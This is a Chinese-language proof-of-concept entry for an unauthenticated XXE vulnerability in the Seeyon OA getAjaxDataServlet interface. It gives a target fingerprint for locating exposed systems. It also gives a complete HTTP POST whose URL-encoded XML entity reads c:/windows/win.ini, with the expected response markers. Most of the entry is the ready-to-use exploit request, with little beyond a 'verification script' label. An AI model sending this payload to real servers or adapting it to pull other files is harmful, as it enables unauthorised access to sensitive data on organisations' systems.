﻿# 致远OA getAjaxDataServlet XXE漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：致远OA互联新一代智慧型协同运营平台以中台的架构和技术、协同、业务、连接、数据的专 业能力，夯实协同运营中台的落地效果；以移动化、AI智能推进前台的应用创新，实现企业轻量化、智能化业务场景，促进企业全过程管理能效，赋予企业协同工作和运营管理的新体验；在协同运营平台全面升级的基础上，V8.0深耕大型企业管理模式、运营机制，进一步强化“协同”在管理中的价值，推动大中型企业、集团企业、国资以及高新技术企业的管理模式升级，帮助企业构筑全程、全域、全端的运营和服务能力，提升人员效率和组织绩效，赋能企业数字化、智能化发展。该系统存在XXE漏洞,致远互联-OA getAjaxDataServlet 接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息,比如读取 c:/windows/win.ini，使系统处于极不安全的状态。

> 漏洞特征：app="致远互联-OA"

> 验证脚本：HTTP

```
POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
Expect: 100-continue
Connection: close

S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：


> 验证文件来源：致远OA getAjaxDataServlet XXE漏洞.poc
